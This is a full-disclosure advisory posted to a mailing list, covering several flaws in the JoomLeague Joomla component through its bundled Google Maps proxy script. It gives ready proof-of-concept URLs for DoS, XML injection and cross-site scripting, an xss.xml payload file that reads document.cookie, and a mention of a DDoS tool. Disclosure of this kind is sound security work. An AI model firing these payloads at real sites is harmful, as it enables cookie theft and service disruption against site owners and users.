Subject: Multiple vulnerabilities in JoomLeague for Joomla

Hello list!

These are Denial of Service, XML Injection, Cross-Site Scripting, Full path
disclosure and Insufficient Anti-automation vulnerabilities in JoomLeague
plugin for Joomla.

These vulnerabilities are in Google Maps plugin for Joomla, which is used in
this plugin. In 2013-2014 I wrote advisories about multiple vulnerabilities
in Google Maps plugin (http://securityvulns.ru/docs29645.html,
http://securityvulns.ru/docs29670.html and
http://seclists.org/fulldisclosure/2014/Feb/53).

-------------------------
Affected products:
-------------------------

Vulnerable are JoomLeague 2.1.12 plugin for Joomla and previous versions.
And packet joomleague-2-komplettpaket, which includes JoomLeague plugin.

Denial of Service (WASC-10):

http://site/components/com_joomleague/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=google.com

Besides conducting DoS attack manually, it's also possible to conduct
automated DoS and DDoS attacks with using of DAVOSET
(http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2013-June/008850.html).

XML Injection (WASC-23):

http://site/components/com_joomleague/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=site2/xml.xml

It's possible to include external xml-files. Which also can be used for XSS
attack:

XSS via XML Injection (WASC-23):

http://site/components/com_joomleague/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=site2/xss.xml

File xss.xml:

<?xml version="1.0" encoding="utf-8"?>
<feed>
  <title>XSS</title>
  <entry>
  <div
xmlns="http://www.w3.org/1999/xhtml"><script>alert(document.cookie)</script></div>
  </entry>
</feed>

Cross-Site Scripting (WASC-08):

http://site/components/com_joomleague/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=%3Cbody%20onload=alert(document.cookie)%3E

This is possible with corresponding PHP settings, when warnings are shown.

Full path disclosure (WASC-13):

http://site/components/com_joomleague/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php

This is possible with corresponding PHP settings, when warnings are shown.

Insufficient Anti-automation (WASC-21):

In this functionality there is no reliable protection from automated
requests.

Also in my third advisory concerning Google Maps plugin, I wrote about
security bypass for built-in domain restriction functionality and described
method of bypass protection against automated requests introduced in version
3.2. So even the latest version is vulnerable to IAA.
